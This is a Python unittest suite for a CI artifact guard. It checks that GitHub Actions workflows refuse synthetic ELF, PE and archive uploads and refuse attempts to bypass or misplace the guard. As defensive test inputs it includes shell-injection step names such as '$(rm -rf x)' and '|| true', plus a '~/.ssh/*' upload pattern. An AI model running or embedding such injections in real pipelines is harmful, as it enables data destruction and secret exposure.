"""Artifact guard (Issue #227): synthetic linked-executable samples are refused; fixture outputs pass.

Samples are generated in memory from short signature bytes; no BIOS, disc, ROM or real Geargrafx binary is used.
"""
from pathlib import Path
import sys
import tempfile
import unittest
import unittest.mock

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard
from artifact_guard import check_upload_artifacts, entry_problem, upload_patterns, ROOT

ELF_PROBE = b'\x7fELF\x02\x01\x01' + b'\x00' * 57   # synthetic ELF header marker only
MACHO = b'\xcf\xfa\xed\xfe' + b'\x00' * 12          # synthetic Mach-O marker only
AR_ARCHIVE = b'!<arch>\n' + b'\x00' * 16            # synthetic ar marker only
PE_STUB = b'MZ' + b'\x00' * 58 + (0x40).to_bytes(4, 'little') + b'PE\x00\x00'
FIXTURE_PCE = b'\x4d\x5a' + b'\x00' * 6 + b'PCE fixture'   # starts with "MZ" but has no PE header
PLAIN_JSON = b'{"synthetic": true}\n'

UPLOAD = 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02'
HEAD = 'jobs:\n  build:\n    steps:\n      - name: Save\n'


def workflow(paths=(), inline=None, path_first=False):
    uses = f'        uses: {UPLOAD}\n'
    if inline is not None:
        section = f'        with:\n          path: {inline}\n'
    else:
        section = '        with:\n          path: |\n' + ''.join(f'            {p}\n' for p in paths)
    return HEAD + (section + uses if path_first else uses + section)


def raw_step(section):
    """An upload step whose `with:` section is given verbatim (for unusual path forms)."""
    return HEAD + f'        uses: {UPLOAD}\n' + section


class EntryTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)

    def make(self, name, data):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return path

    def test_fixture_outputs_pass(self):
        self.assertIsNone(entry_problem(self.make('smoke.pce', FIXTURE_PCE)))
        self.assertIsNone(entry_problem(self.make('evidence.json', PLAIN_JSON)))
        self.assertIsNone(entry_problem(self.make('geargrafx-evidence.json', PLAIN_JSON)))

    def test_linked_executable_without_suffix_is_refused(self):
        self.assertIsNotNone(entry_problem(self.make('geargrafx-cdread-probe', ELF_PROBE)))

    def test_object_and_archive_are_refused(self):
        self.assertIsNotNone(entry_problem(self.make('probe.o', PLAIN_JSON)))
        self.assertIsNotNone(entry_problem(self.make('libgeargrafx.a', AR_ARCHIVE)))
        self.assertIsNotNone(entry_problem(self.make('probe.map', AR_ARCHIVE)))

    def test_macho_and_pe_signatures_are_refused(self):
        self.assertIsNotNone(entry_problem(self.make('probe.bin.dat', MACHO)))
        self.assertIsNotNone(entry_problem(self.make('probe.dat', PE_STUB)))

    def test_short_mz_fixture_is_not_refused(self):
        self.assertIsNone(entry_problem(self.make('rom.dat', FIXTURE_PCE)))

    def test_mz_with_ne_or_le_header_is_refused(self):
        for tag in (b'NE', b'LE', b'LX'):
            with self.subTest(tag=tag):
                data = b'MZ' + b'\x00' * 58 + (0x40).to_bytes(4, 'little') + tag + b'\x00\x00'
                self.assertIn('executable', entry_problem(self.make('old-' + tag.decode() + '.dat', data)))

    def test_archives_are_refused_by_suffix_and_magic(self):
        for suffix in ('.zip', '.tar', '.gz', '.7z', '.tgz', '.xz', '.rar'):
            with self.subTest(suffix=suffix):
                self.assertIn('archive suffix', entry_problem(self.make('a' + suffix, PLAIN_JSON)))
        for name, magic in (('zip', b'PK\x03\x04'), ('gz', b'\x1f\x8b\x08'), ('7z', b'7z\xbc\xaf\x27\x1c'),
                            ('bz2', b'BZh9'), ('xz', b'\xfd7zXZ\x00'), ('rar', b'Rar!\x1a\x07')):
            with self.subTest(magic=name):
                self.assertEqual('archive signature', entry_problem(self.make('blob-' + name + '.dat', magic + b'\x00' * 8)))
        tar = b'\x00' * 257 + b'ustar\x00' + b'\x00' * 10
        self.assertEqual('archive signature', entry_problem(self.make('blob.tar.dat', tar)))

    def test_pe_header_past_4k_is_refused(self):
        # Regression (review finding 3): e_lfanew above the old 4096-byte head window was never checked.
        pe_offset = 5000
        data = b'MZ' + b'\x00' * 58 + pe_offset.to_bytes(4, 'little') + b'\x00' * (pe_offset - 64) + b'PE\x00\x00'
        self.assertIn('PE/NE/LE executable', entry_problem(self.make('late-pe.dat', data)))

    def test_mz_with_pe_header_beyond_eof_is_refused(self):
        # Regression (review finding 3): a header that cannot be read in full must fail closed.
        data = b'MZ' + b'\x00' * 58 + (0x1000).to_bytes(4, 'little') + b'\x00' * 40
        self.assertIsNotNone(entry_problem(self.make('truncated-pe.dat', data)))

    def test_symlink_is_refused(self):
        target = self.make('target.pce', FIXTURE_PCE)
        link = self.root / 'link.pce'
        try:
            link.symlink_to(target)
        except (OSError, NotImplementedError):
            self.skipTest('symlinks unavailable on this host')
        self.assertEqual(entry_problem(link), 'symlink')


class PcePolicyTests(unittest.TestCase):
    """Approved policy: .pce is not refused by suffix alone; content signatures still apply to .pce files."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)

    def make(self, name, data):
        path = self.root / name
        path.write_bytes(data)
        return path

    def test_pce_with_ordinary_content_is_not_refused_by_suffix(self):
        self.assertIsNone(entry_problem(self.make('dev-diagnostic.pce', b'PCE original bytes, no signature')))
        self.assertIsNone(entry_problem(self.make('original.pce', bytes(range(256)))))

    def test_pce_with_executable_or_archive_content_is_still_refused(self):
        self.assertIsNotNone(entry_problem(self.make('a.pce', ELF_PROBE)))
        self.assertIsNotNone(entry_problem(self.make('b.pce', PE_STUB)))
        self.assertIsNotNone(entry_problem(self.make('c.pce', AR_ARCHIVE)))
        self.assertIsNotNone(entry_problem(self.make('d.pce', b'PK\x03\x04' + b'\x00' * 8)))


class WorkflowTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        (self.root / '.github' / 'workflows').mkdir(parents=True)

    def write_workflow(self, text, name='ci.yml'):
        (self.root / '.github' / 'workflows' / name).write_text(text, encoding='utf-8')

    def write_build(self, relative, data):
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)

    def test_block_and_inline_path_forms_are_parsed(self):
        self.assertEqual(upload_patterns(workflow(['build/debug/*.pce', 'build/debug/*.json'])),
                         ['build/debug/*.pce', 'build/debug/*.json'])
        self.assertEqual(upload_patterns(workflow(inline='build/debug/*.pce')), ['build/debug/*.pce'])

    def test_path_before_uses_is_parsed_as_a_whole_step(self):
        # Regression (review finding 1): key order inside the step must not drop its patterns.
        self.assertEqual(upload_patterns(workflow(['build/debug/*.pce'], path_first=True)), ['build/debug/*.pce'])
        self.write_workflow(workflow(['build/debug/*.pce'], path_first=True))
        self.write_build('build/debug/linked-probe.pce', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'linked-probe'):
            check_upload_artifacts(self.root)

    def test_keep_chomping_block_is_parsed(self):
        # Regression (review finding 3): `|+` used to become a literal pattern that matched nothing.
        section = '        with:\n          path: |+\n            build/debug/*.pce\n'
        self.assertEqual(upload_patterns(raw_step(section)), ['build/debug/*.pce'])
        self.write_workflow(raw_step(section))
        self.write_build('build/debug/linked-probe.pce', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'linked-probe'):
            check_upload_artifacts(self.root)

    def test_flow_list_is_parsed(self):
        # Regression (review finding 3): `[a, b]` used to become one literal pattern that matched nothing.
        section = '        with:\n          path: [build/debug/*.pce, build/debug/linked-probe]\n'
        self.assertEqual(upload_patterns(raw_step(section)), ['build/debug/*.pce', 'build/debug/linked-probe'])
        self.write_workflow(raw_step(section))
        self.write_build('build/debug/linked-probe', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'linked-probe'):
            check_upload_artifacts(self.root)

    def test_unrecognised_path_forms_are_refused(self):
        for section in ('        with:\n          path: >\n            build/debug/*.pce\n',
                        '        with:\n          path: ["build/a,b.pce"]\n',
                        '        with:\n          path:\n'):
            with self.subTest(section=section):
                self.write_workflow(raw_step(section))
                with self.assertRaises(ValueError):
                    check_upload_artifacts(self.root)

    def test_upload_step_without_path_fails_closed(self):
        self.write_workflow(raw_step('        with:\n          name: x\n'))
        with self.assertRaisesRegex(ValueError, 'without a parseable path'):
            check_upload_artifacts(self.root)

    def test_glob_that_reaches_a_linked_executable_fails_closed(self):
        self.write_workflow(workflow(['build/debug/**']))
        self.write_build('build/debug/cdread-probe/geargrafx-cdread-probe', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'geargrafx-cdread-probe'):
            check_upload_artifacts(self.root)

    def test_directory_match_is_checked_recursively(self):
        # Regression (review finding 2): a glob matching a directory used to pass its contents unchecked.
        self.write_workflow(workflow(['build/debug/*.json']))
        self.write_build('build/debug/evidence.json/nested/linked-probe', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'linked-probe'):
            check_upload_artifacts(self.root)

    def test_unreadable_directory_fails_closed(self):
        # os.walk skips directories it cannot list; the guard must refuse instead of passing them unseen.
        self.write_workflow(workflow(['build/debug/*.json']))
        self.write_build('build/debug/evidence.json/nested/file.txt', PLAIN_JSON)
        real = guard.os.walk
        def failing(top, onerror=None, **kwargs):
            if onerror:
                onerror(PermissionError('simulated unreadable directory'))
            return real(top, onerror=onerror, **kwargs)
        with unittest.mock.patch.object(guard.os, 'walk', failing):
            with self.assertRaises(PermissionError):
                check_upload_artifacts(self.root)

    def test_symlink_inside_matched_directory_is_refused(self):
        self.write_workflow(workflow(['build/debug/*.json']))
        self.write_build('build/debug/evidence.json/target.pce', FIXTURE_PCE)
        link = self.root / 'build/debug/evidence.json/link.pce'
        try:
            link.symlink_to(self.root / 'build/debug/evidence.json/target.pce')
        except (OSError, NotImplementedError):
            self.skipTest('symlinks unavailable on this host')
        with self.assertRaisesRegex(ValueError, 'link.pce'):
            check_upload_artifacts(self.root)

    def test_probe_directory_is_not_matched_by_fixture_globs(self):
        self.write_workflow(workflow(['build/debug/*.pce', 'build/debug/*.json']))
        self.write_build('build/debug/geargrafx-api-probe', ELF_PROBE)
        self.write_build('build/debug/smoke-test-not-bios.pce', FIXTURE_PCE)
        check_upload_artifacts(self.root)

    def test_quoted_path_key_next_to_env_is_refused(self):
        # Review finding 3: `"path":` was invisible to the parser, so the ELF-magic file below passed.
        self.write_build('build/probe', ELF_PROBE)
        self.write_workflow(HEAD + f'        uses: {UPLOAD}\n        env:\n          X: 1\n        with:\n'
                            '          "path": build/probe\n')
        with self.assertRaisesRegex(ValueError, 'ambiguous path key'):
            check_upload_artifacts(self.root)
        for section in ('          path : build/probe\n', "          'path': build/probe\n",
                        '          path: a\n          "path": b\n'):
            with self.subTest(section=section):
                with self.assertRaises(ValueError):
                    upload_patterns(raw_step('        with:\n' + section))

    def test_tilde_home_pattern_is_refused(self):
        for pattern in ('~/x', '~', '~/.ssh/*'):
            with self.subTest(pattern=pattern):
                self.write_workflow(workflow([pattern]))
                with self.assertRaisesRegex(ValueError, 'unsafe pattern'):
                    check_upload_artifacts(self.root)

    def test_post_build_checks_real_output_and_fails_closed(self):
        step = 'Save'
        self.write_workflow(workflow(['build/out/*.pce']))
        rel = '.github/workflows/ci.yml'
        with self.assertRaisesRegex(ValueError, 'matched no built artifact'):   # build output missing
            guard.check_post_build(rel, step, self.root)
        self.write_build('build/out/ok.pce', FIXTURE_PCE)
        guard.check_post_build(rel, step, self.root)
        self.write_build('build/out/bad.pce', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'executable signature'):
            guard.check_post_build(rel, step, self.root)
        with self.assertRaisesRegex(ValueError, 'expected exactly one'):   # unknown step name
            guard.check_post_build(rel, 'Nope', self.root)

    def test_unsafe_or_expression_patterns_are_refused(self):
        for pattern in ('../outside/*.pce', '/abs/*.pce', '${{ github.workspace }}/*.pce'):
            with self.subTest(pattern=pattern):
                self.write_workflow(workflow([pattern]))
                with self.assertRaises(ValueError):
                    check_upload_artifacts(self.root)

    def test_uses_key_spellings_are_parsed_as_upload_steps(self):
        # Regression (review finding 2): case, spacing before the colon and quotes must not skip the step.
        sha = UPLOAD.split('@', 1)[1]
        spellings = (f'uses: Actions/Upload-Artifact@{sha}',
                     f'uses : actions/upload-artifact@{sha}',
                     f'"uses": "actions/upload-artifact@{sha}"')
        for uses_line in spellings:
            with self.subTest(uses=uses_line):
                text = HEAD + f'        {uses_line}\n        with:\n          path: |\n            build/debug/*.pce\n'
                self.assertEqual(upload_patterns(text), ['build/debug/*.pce'])
                self.write_workflow(text)
                self.write_build('build/debug/linked-probe.pce', ELF_PROBE)
                with self.assertRaisesRegex(ValueError, 'linked-probe'):
                    check_upload_artifacts(self.root)

    def test_upload_reference_that_is_not_a_parsed_step_fails_closed(self):
        # Regression (review finding 2): an upload-artifact mention outside a parsed step must not pass silently.
        self.write_workflow(workflow(['build/debug/*.json']) + '        run: echo upload-artifact\n')
        with self.assertRaisesRegex(ValueError, 'not a parsed step'):
            check_upload_artifacts(self.root)
        self.write_workflow(HEAD + '        uses: docker://example/upload-artifact:1\n')
        with self.assertRaisesRegex(ValueError, 'not a parsed step'):
            check_upload_artifacts(self.root)

    def test_brace_extglob_and_alternation_patterns_are_refused(self):
        # Regression (review finding 1): pathlib matched nothing for these, so an ELF in the tree was accepted.
        self.write_build('build/debug/linked-probe', ELF_PROBE)
        self.write_build('build/other/linked-probe', ELF_PROBE)
        for pattern in ('build/{debug,other}/*.pce', 'build/@(debug|other)/*.pce', 'build/debug/*.{pce,json}',
                        'build/(debug)/*.pce', 'build/debug|other/*.pce'):
            with self.subTest(pattern=pattern):
                self.write_workflow(workflow([pattern]))
                with self.assertRaisesRegex(ValueError, 'unsupported pattern'):
                    check_upload_artifacts(self.root)

    def test_yaml_extension_workflow_is_scanned(self):
        # Review MAJOR: a new *.yaml workflow was never globbed, so its ELF upload bypassed the guard.
        self.write_workflow(workflow(['build/debug/*.pce']), name='ci.yml')
        self.write_workflow(workflow(['build/probe/*']), name='extra.yaml')
        self.write_build('build/probe/linked-probe', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, r'extra\.yaml: build/probe/linked-probe'):
            check_upload_artifacts(self.root)
        for name, data in (('probe.exe', PLAIN_JSON), ('probe.obj', PLAIN_JSON), ('macho', MACHO), ('pe.dat', PE_STUB)):
            with self.subTest(name=name):
                self.write_build('build/probe/' + name, data)
                self.write_build('build/probe/linked-probe', FIXTURE_PCE)
                with self.assertRaisesRegex(ValueError, 'extra.yaml'):
                    check_upload_artifacts(self.root)
                (self.root / 'build/probe' / name).unlink()

    def test_pages_artifact_composite_action_and_release_routes_are_guarded(self):
        pages = workflow(['site']).replace('upload-artifact', 'upload-pages-artifact')
        self.write_workflow(pages)
        self.write_build('site/tool', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'site/tool'):
            check_upload_artifacts(self.root)
        self.write_workflow(workflow(['build/debug/*.pce']))
        action = self.root / '.github' / 'actions' / 'save'
        action.mkdir(parents=True)
        (action / 'action.yaml').write_text(workflow(['site']), encoding='utf-8')
        with self.assertRaisesRegex(ValueError, 'action.yaml: site/tool'):
            check_upload_artifacts(self.root)
        for route in ('run: gh release upload v1 build/x', 'uses: softprops/action-gh-release@v2',
                      'uses: ncipollo/release-action@v1', 'uses: ./.github/actions/up',
                      'uses: o/r/.github/workflows/u.yml@v1'):
            with self.subTest(route=route):
                self.write_workflow(workflow(['build/debug/*.pce']) + f'      - {route}\n', name='rel.yaml')
                with self.assertRaisesRegex(ValueError, 'not a parsed step'):
                    check_upload_artifacts(self.root)

    def test_prose_containing_release_is_not_a_false_positive(self):
        self.write_workflow(workflow(['build/debug/*.pce']) + '      - name: pass through release gate\n', name='ok.yaml')
        self.write_build('build/debug/smoke-test-not-bios.pce', FIXTURE_PCE)
        check_upload_artifacts(self.root)

    def test_legitimate_evidence_and_self_made_rom_in_yaml_workflow_pass(self):
        self.write_workflow(workflow(['build/debug/*.pce', 'build/debug/*.json']), name='ok.yaml')
        self.write_build('build/debug/geargrafx-evidence.json', PLAIN_JSON)
        self.write_build('build/debug/smoke-test-not-bios.pce', FIXTURE_PCE)
        check_upload_artifacts(self.root)

    def test_missing_upload_steps_fail_closed(self):
        self.write_workflow('jobs:\n  build:\n    steps:\n      - run: make check\n')
        with self.assertRaisesRegex(ValueError, 'no upload-artifact'):
            check_upload_artifacts(self.root)


TRUSTED_GUARD = '".trusted-main/tools/artifact_guard.py"'
GUARD_PREFIX = '"${{ steps.pyresolve.outputs.python }}" ' + TRUSTED_GUARD + ' --root "$GITHUB_WORKSPACE"'
CALL = GUARD_PREFIX + ' --stage w.yml "Save"'
VERIFY_CALL = GUARD_PREFIX + ' --verify w.yml "Save"'
CHECK_CALL = GUARD_PREFIX + ' --check-placement'
TRUSTED_CHECKOUT = ('      - name: Trusted guard (main)\n'
                    '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                    '        with:\n          ref: main\n          path: .trusted-main\n'
                    '          sparse-checkout: tools/artifact_guard.py\n          sparse-checkout-cone-mode: false\n          persist-credentials: false\n')
PY_RESOLVE = ('      - name: Resolve python3 (trusted)\n        id: pyresolve\n'
              '        run: echo "python=$(command -v python3)" >> "$GITHUB_OUTPUT"\n')
PLACEMENT_STEP = '      - name: Guard placement (trusted)\n        run: ' + CHECK_CALL + '\n'
PR_CHECKOUT = ('      - name: Checkout workflow files only\n'
               '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
               '        with:\n          sparse-checkout: .github/workflows\n'
               '          persist-credentials: false\n')
PREAMBLE = PR_CHECKOUT + TRUSTED_CHECKOUT + PY_RESOLVE + PLACEMENT_STEP
STAGE_STEP = '      - name: Stage\n        run: |\n          ' + CALL + '\n'
VERIFY_STEP = '      - name: Verify\n        run: |\n          ' + VERIFY_CALL + '\n'
GUARD_STEP = PREAMBLE + STAGE_STEP + VERIFY_STEP
SAVE_STEP = f'      - name: Save\n        uses: {UPLOAD}\n        with:\n          path: .artifact-stage/build/x\n'
GUARDED = 'jobs:\n  build:\n    steps:\n' + GUARD_STEP + SAVE_STEP


def guarded_with_name(name):
    """A complete, well-formed job whose upload step (and its stage and verify calls) use `name`."""
    return ('jobs:\n  build:\n    steps:\n' + PREAMBLE
            + f'      - name: Stage\n        run: {GUARD_PREFIX} --stage w.yml "{name}"\n'
            + f'      - name: Verify\n        run: {GUARD_PREFIX} --verify w.yml "{name}"\n'
            + f'      - name: {name}\n        uses: {UPLOAD}\n        with:\n          path: .artifact-stage/build/x\n')


class GuardPlacementTests(unittest.TestCase):
    def violations(self, text):
        return guard.guard_placement_violations(text, 'w.yml')

    def test_well_formed_guard_passes(self):
        self.assertEqual([], self.violations(GUARDED))

    def test_each_defect_is_a_violation(self):
        head = 'jobs:\n  build:\n    steps:\n'
        defects = {
            'if': GUARDED.replace('        run: |', '        if: ${{ false }}\n        run: |'),
            'continue-on-error': GUARDED.replace('        run: |', '        continue-on-error: true\n        run: |'),
            'commented': GUARDED.replace('          ' + CALL, '          # ' + CALL),
            'other job': head + GUARD_STEP + '  other:\n    steps:\n' + SAVE_STEP,
            'after upload': head + SAVE_STEP + GUARD_STEP,
            'duplicate': head + GUARD_STEP + GUARD_STEP.replace('Guard', 'Guard2') + SAVE_STEP,
            'not a run': GUARDED.replace('        run: |\n          ' + CALL, '        name2: x\n        with:\n          x: ' + CALL),
            'missing': GUARDED.replace(CALL, 'true'),
        }
        for label, text in defects.items():
            with self.subTest(defect=label):
                self.assertNotEqual([], self.violations(text))


    def test_call_must_be_the_run_command(self):
        run = '        run: |\n          ' + CALL
        bad = {
            'echo comment': f'        run: echo # {CALL}',
            'echo call': f'        run: echo {CALL}',
            'env only': f'        env:\n          X: {CALL}\n        run: true',
            'block echo': '        run: |\n          echo ' + CALL,
            'comment first': '        run: |\n          # ' + CALL,
        }
        for label, step in bad.items():
            with self.subTest(bad=label):
                text = GUARDED.replace(run, step)
                self.assertNotEqual(text, GUARDED)
                self.assertNotEqual([], self.violations(text))

    def test_guard_exit_status_must_not_be_swallowed(self):
        run = '        run: |\n          ' + CALL
        bad = {
            'or true': f'        run: {CALL} || true',
            'background': f'        run: {CALL} &',
            'pipe': f'        run: {CALL} | cat',
            'semicolon': f'        run: {CALL} ; true',
            'and then or': f'        run: {CALL} && echo x || true',
            'and tail inline': f'        run: {CALL} && echo done',
            'block or true': run + ' || true',
            'block continuation': run + ' \\n          || true',
            'shell python': '        shell: python\n' + run,
            'shell echo': '        shell: echo {0}\n' + run,
        }
        for label, step in bad.items():
            with self.subTest(bad=label):
                text = GUARDED.replace(run, step)
                self.assertNotEqual(text, GUARDED)
                self.assertNotEqual([], self.violations(text))

    def test_accepted_run_forms(self):
        run = '        run: |\n          ' + CALL
        for step in (f'        run: {CALL}',
                     '        run: >-\n          ' + CALL, run,
                     '        shell: bash\n' + run, '        shell: "bash"\n' + run):
            with self.subTest(step=step):
                self.assertEqual([], self.violations(GUARDED.replace(run, step)))

    def test_single_live_line_is_required(self):
        run = '        run: |\n          ' + CALL
        bad = {
            'multi-line and': run + ' && echo a\n          echo done',
            'second line': run + '\n          echo done',
            'and tail': run + ' && echo done',
            'comment tail': run + ' # note',
            'set +e': '        run: |\n          set +e\n          ' + CALL,
            'set +o errexit': '        run: |\n          set +o errexit\n          ' + CALL,
        }
        for label, step in bad.items():
            with self.subTest(bad=label):
                text = GUARDED.replace(run, step)
                self.assertNotEqual(text, GUARDED)
                self.assertNotEqual([], self.violations(text))

    def test_flow_style_steps_raise_clear_error(self):
        with self.assertRaisesRegex(ValueError, 'w.yml: flow-style steps unsupported'):
            self.violations('jobs:\n  build:\n    steps: [ {uses: ' + UPLOAD + '} ]\n')

    def test_build_step_inserted_between_guard_and_upload_is_refused(self):
        build = '      - name: Build\n        run: make build\n'
        self.assertNotEqual([], self.violations(GUARDED.replace(SAVE_STEP, build + SAVE_STEP)))
        mutate = '      - name: Mutate\n        run: cp x build/x\n'
        self.assertNotEqual([], self.violations(GUARDED.replace(SAVE_STEP, mutate + SAVE_STEP)))

    def test_guard_must_be_the_step_immediately_before_each_upload(self):
        build = '      - name: Build\n        run: make build\n'
        text = 'jobs:\n  build:\n    steps:\n' + GUARD_STEP + SAVE_STEP + build + SAVE_STEP
        self.assertNotEqual([], self.violations(text))
        text = 'jobs:\n  build:\n    steps:\n' + GUARD_STEP + build + SAVE_STEP
        self.assertNotEqual([], self.violations(text))

    def test_reordered_guard_after_build_is_refused(self):
        build = '      - name: Build\n        run: make build\n'
        text = 'jobs:\n  build:\n    steps:\n' + SAVE_STEP + build + GUARD_STEP
        self.assertNotEqual([], self.violations(text))

    def test_dotted_job_name_cannot_borrow_another_jobs_guard(self):
        # Before the fix, "a.b" and "a.c" both parsed as job None, so a guard in one satisfied the other.
        text = 'jobs:\n  a.b:\n    steps:\n' + GUARD_STEP + '  a.c:\n    steps:\n' + SAVE_STEP
        self.assertNotEqual([], self.violations(text))

    def test_quoted_job_name_cannot_borrow_another_jobs_guard(self):
        text = 'jobs:\n  "a.b":\n    steps:\n' + GUARD_STEP + "  'a.c':\n    steps:\n" + SAVE_STEP
        self.assertNotEqual([], self.violations(text))

    def test_dotted_job_names_each_with_own_guard_pass(self):
        # Legitimate dotted names must not be mistaken for a duplicate or missing guard.
        text = ('jobs:\n  build.x:\n    steps:\n' + GUARD_STEP + SAVE_STEP
                + '  build.y:\n    steps:\n' + GUARD_STEP.replace('\"Save\"', '\"Save2\"') + SAVE_STEP.replace('name: Save\n', 'name: Save2\n'))
        self.assertEqual([], self.violations(text))

    def test_duplicate_job_name_is_refused(self):
        text = 'jobs:\n  build:\n    steps:\n' + GUARD_STEP + '  build:\n    steps:\n' + SAVE_STEP
        with self.assertRaisesRegex(ValueError, 'duplicate job name'):
            self.violations(text)

    def test_guard_step_with_env_or_working_directory_is_refused(self):
        run = '        run: |\n          ' + CALL
        bad = {
            'env RUNNER_TEMP': '        env:\n          RUNNER_TEMP: /tmp/x\n' + run,
            'env PATH': '        env:\n          PATH: /tmp/x\n' + run,
            'working-directory': '        working-directory: /tmp\n' + run,
            'duplicate run': run + '\n        run: true',
            'extra key': '        timeout-minutes: 1\n' + run,
        }
        for label, step in bad.items():
            with self.subTest(bad=label):
                text = GUARDED.replace(run, step)
                self.assertNotEqual(text, GUARDED)
                self.assertNotEqual([], self.violations(text))

    def test_job_or_workflow_env_and_defaults_are_refused(self):
        bad = {
            'job env': GUARDED.replace('    steps:\n', '    env:\n      PATH: /tmp/x\n    steps:\n', 1),
            'top env': 'env:\n  RUNNER_TEMP: /tmp/x\n' + GUARDED,
            'job defaults': GUARDED.replace('    steps:\n', '    defaults:\n      run:\n        working-directory: /tmp\n    steps:\n', 1),
            'job container': GUARDED.replace('    steps:\n', '    container: other-image\n    steps:\n', 1),
        }
        for label, text in bad.items():
            with self.subTest(bad=label):
                self.assertNotEqual([], self.violations(text))

    def test_upload_name_cannot_smuggle_shell_into_guard_call(self):
        # The name is embedded in the guard calls. A quote-breaking name must not make the run line pass as a
        # bare guard call (guard failure swallowed, upload runs).
        self.assertNotEqual([], self.violations(guarded_with_name('Save" || true; echo "x')))

    def test_upload_name_with_expansion_or_escape_characters_is_refused(self):
        for name in ('Save $(rm -rf x)', 'Save `id`', 'Save \\\\ x', 'Save $HOME'):
            with self.subTest(name=name):
                self.assertNotEqual([], self.violations(guarded_with_name(name)))

    def test_run_line_with_extra_argument_is_refused(self):
        run = '        run: |\n          ' + CALL
        text = GUARDED.replace(run, '        run: ' + CALL + ' --x')
        self.assertNotEqual([], self.violations(text))

    def test_upload_step_if_and_continue_on_error_are_refused(self):
        # MAJOR-2: only name, uses, with are allowed on the upload step.
        bad = {
            'if': SAVE_STEP.replace('        uses:', '        if: ${{ false }}\n        uses:'),
            'continue-on-error': SAVE_STEP.replace('        uses:', '        continue-on-error: true\n        uses:'),
            'env': SAVE_STEP.replace('        uses:', '        env:\n          X: 1\n        uses:'),
        }
        for label, step in bad.items():
            with self.subTest(bad=label):
                self.assertNotEqual([], self.violations(GUARDED.replace(SAVE_STEP, step)))

    def test_unquoted_operator_name_is_refused_while_quoted_name_passes(self):
        # MINOR-B: an unquoted "||" in the name is an operator for bash. The quoted form is one argument.
        def job(call_arg, upload_name):
            return ('jobs:\n  build:\n    steps:\n' + PREAMBLE
                    + f'      - name: Stage\n        run: {GUARD_PREFIX} --stage w.yml {call_arg}\n'
                    + f'      - name: Verify\n        run: {GUARD_PREFIX} --verify w.yml {call_arg}\n'
                    + f'      - name: {upload_name}\n        uses: {UPLOAD}\n        with:\n          path: .artifact-stage/build/x\n')
        self.assertEqual([], self.violations(job('"Save||true"', '"Save||true"')))
        self.assertNotEqual([], self.violations(job('Save||true', 'Save||true')))

    def test_multiline_plain_name_is_refused(self):
        # MINOR-A: a continuation line after `name:` changes the YAML name.
        text = ('jobs:\n  build:\n    steps:\n' + PREAMBLE + STAGE_STEP + VERIFY_STEP
                + f'      - name: Save\n          continued\n        uses: {UPLOAD}\n        with:\n          path: .artifact-stage/build/x\n')
        self.assertNotEqual([], self.violations(text))

    def test_workflow_path_with_shell_characters_is_refused(self):
        with self.assertRaisesRegex(ValueError, 'unsafe workflow path'):
            guard.guard_placement_violations(GUARDED, 'w y.yml')

    def test_guard_in_other_job_that_is_needed_is_refused(self):
        # needs: is not a substitute for a guard in the upload's own job, immediately before it.
        text = ('jobs:\n  build:\n    steps:\n' + GUARD_STEP
                + '  publish:\n    needs: build\n    steps:\n' + SAVE_STEP)
        self.assertNotEqual([], self.violations(text))

    def test_make_check_path_enforces_placement_not_only_patterns(self):
        # check.py calls check_guard_placement; a build step inserted between verify and upload must fail there too.
        import tempfile
        rel = '.github/workflows/w.yml'
        text = (GUARDED.replace(' w.yml ', f' {rel} ')
                .replace(SAVE_STEP, '      - name: Build\n        run: make build\n' + SAVE_STEP))
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, '.github', 'workflows').mkdir(parents=True)
            Path(tmp, rel).write_text(text, encoding='utf-8')
            with self.assertRaisesRegex(ValueError, 'immediately before'):
                guard.check_guard_placement(Path(tmp))

    def test_placement_refuses_a_publication_route_without_an_upload_step(self):
        # Review finding A (MEDIUM): check_guard_placement only inspected files that contained an upload-artifact
        # uses: line, so --check-placement silently passed a workflow that published through a release route while
        # check_upload_artifacts refused it. The two layers must scan the same files and refuse the same routes.
        step_head = ('jobs:\n  build:\n    steps:\n'
                     '      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n')
        routes = {
            'gh release': step_head + '      - name: Release\n        run: gh release upload v1 build/x\n',
            'softprops': step_head + '      - name: Release\n        uses: softprops/action-gh-release@v2\n',
            'ncipollo': step_head + '      - name: Release\n        uses: ncipollo/release-action@v1\n',
            'local action': step_head + '      - name: Release\n        uses: ./.github/actions/up\n',
            'reusable workflow': 'jobs:\n  call:\n    uses: ./.github/workflows/other.yml\n',
        }
        for label, text in routes.items():
            with self.subTest(route=label):
                with tempfile.TemporaryDirectory() as tmp:
                    Path(tmp, '.github', 'workflows').mkdir(parents=True)
                    Path(tmp, '.github', 'workflows', 'w.yml').write_text(text, encoding='utf-8')
                    with self.assertRaises(ValueError):
                        guard.check_guard_placement(Path(tmp))
                    with self.assertRaises(ValueError):   # the content layer already refused these
                        guard.check_upload_artifacts(Path(tmp))

    def test_placement_passes_a_workflow_that_publishes_nothing(self):
        # A file with no upload step and no publishing route is not a publication and must not become a false positive.
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, '.github', 'workflows').mkdir(parents=True)
            Path(tmp, '.github', 'workflows', 'build.yml').write_text(
                'jobs:\n  build:\n    steps:\n      - run: make build\n', encoding='utf-8')
